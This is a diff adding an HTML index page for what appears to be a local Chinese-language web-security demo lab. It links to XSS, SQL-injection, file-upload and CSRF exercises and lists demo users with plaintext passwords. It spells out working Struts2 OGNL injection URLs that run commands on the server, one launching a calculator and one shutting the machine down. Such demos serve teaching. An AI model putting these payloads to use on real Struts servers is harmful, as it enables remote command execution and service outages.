@@ -1,0 +1,53 @@
+
+<div style="margin: 100px auto; background-color: #eee; font-size:20px;">
+1、<a href="xss_example.php" target="_blank">非持久化的XSS</a>
+<br />
+<br />
+
+2、<a href="xss_home.php" target="_blank">持久化的XSS</a>
+<br />
+<br />
+
+3、<a href="sql_login.html" target="_blank">绕过登陆-SQL注入</a>
+<br />
+<br />
+
+4、<a href="sql_yinhe.php" target="_blank">模糊查询-SQL注入</a>
+<br />
+<br />
+
+5、远程漏洞-strusts：
+<br />
+<br />
+首页面 http://localhost:8080/struts2-showcase-2.1.6/showcase.jsp
+<br />
+打开计算器 http://localhost:8080/struts2-showcase-2.1.6/employee/save.action?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{%27calc%27})).start()}
+<br />
+关机 http://localhost:8080/struts2-showcase-2.1.6/employee/save.action?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'Shutdown','-s','-t','100'})).start()}
+<br />
+<br />
+
+6、<a href="remote_post.html" target="_blank">远程漏洞-上传、修改后缀、执行</a>
+<br />
+<br />
+
+7、CSRF漏洞
+<br />
+无恶意：退出，如果服务器限制一个cookie只能登陆一个账号，攻击者可以发送/logout.php的链接诱导用户退出，然后自己登陆。
+<br />
+影响小：投票，刷展现数、点击数；
+<br />
+影响大：充值，<a href="csrf_normal.php" target="_blank">链接</a>
+<br />
+<br />
+
+<hr />
+user表：
+<ul>
+<li>"user_name"	"password"	"display_name"</li>
+<li>"pss01"	"123456"	"peishuaishuai01"</li>
+<li>"admin"	"admin"	"Admin"</li>
+<li>"pss02"	"123456"	"peishuaishuai02"</li>
+<li>"pss03"	"123456"	"peishuaishuai03"</li>
+</ul>
+</div>
